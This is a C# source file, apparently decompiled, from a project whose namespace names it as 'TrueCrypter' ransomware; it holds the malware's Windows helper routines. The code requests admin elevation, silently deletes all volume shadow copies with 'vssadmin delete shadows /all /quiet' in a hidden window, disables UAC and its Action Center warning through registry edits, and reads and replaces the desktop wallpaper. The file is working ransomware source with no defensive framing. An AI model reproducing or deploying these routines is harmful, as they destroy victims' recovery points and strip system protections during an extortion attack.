using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;
using TrueCrypter.Ransomware.Core.Misc;

namespace TrueCrypter.Ransomware.Core.Wrappers;

public class Windows
{
	private enum TokenInformationClass
	{
		TokenUser = 1,
		TokenGroups,
		TokenPrivileges,
		TokenOwner,
		TokenPrimaryGroup,
		TokenDefaultDacl,
		TokenSource,
		TokenType,
		TokenImpersonationLevel,
		TokenStatistics,
		TokenRestrictedSids,
		TokenSessionId,
		TokenGroupsAndPrivileges,
		TokenSessionReference,
		TokenSandBoxInert,
		TokenAuditPolicy,
		TokenOrigin,
		TokenElevationType,
		TokenLinkedToken,
		TokenElevation,
		TokenHasRestrictions,
		TokenAccessInformation,
		TokenVirtualizationAllowed,
		TokenVirtualizationEnabled,
		TokenIntegrityLevel,
		TokenUiAccess,
		TokenMandatoryPolicy,
		TokenLogonSid,
		MaxTokenInfoClass
	}

	private enum TokenElevationType
	{
		TokenElevationTypeDefault = 1,
		TokenElevationTypeFull,
		TokenElevationTypeLimited
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetTokenInformation(IntPtr tokenHandle, TokenInformationClass tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);

	public static bool IsProcessElevated()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ElevateProcess()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo(Process.GetCurrentProcess().MainModule!.FileName)
			{
				Verb = "runas"
			};
			Process.Start(startInfo);
		}
		catch
		{
			Environment.Exit(1);
		}
	}

	public static bool IsUserAdministrator()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			if (current == null)
			{
				return false;
			}
			if (new WindowsPrincipal(current).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return true;
			}
			if (Environment.OSVersion.Platform == PlatformID.Win32NT && Environment.OSVersion.Version.Major >= 6)
			{
				int returnLength = Marshal.SizeOf(typeof(int));
				IntPtr intPtr = Marshal.AllocHGlobal(returnLength);
				try
				{
					if (!GetTokenInformation(current.Token, TokenInformationClass.TokenElevationType, intPtr, returnLength, out returnLength))
					{
						return false;
					}
					return Marshal.ReadInt32(intPtr) switch
					{
						1 => false, 
						2 => true, 
						3 => true, 
						_ => false, 
					};
				}
				finally
				{
					if (intPtr != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(intPtr);
					}
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void ClearRestorePoints()
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo2 = (process.StartInfo = new ProcessStartInfo("cmd.exe")
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = "/C vssadmin delete shadows /all /quiet"
			});
			process.Start();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public static string GetDesktopWallpaper()
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = new string('\0', 260);
			SystemParametersInfo(115, text.Length, text, 0);
			return text.Substring(0, text.IndexOf('\0'));
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
			return null;
		}
	}

	public static void SetDesktopWallpaper(string Path)
	{
		SystemParametersInfo(20, 0, Path, 3);
	}

	public static void DisableUAC()
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin", 0);
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "PromptOnSecureDesktop", 0);
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Action Center\\Checks\\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.check.0", "CheckSetting", Utility.StringToByteArray("23004100430042006C006F00620000000000000000000000010000000000000000000000"), RegistryValueKind.Binary);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}
}
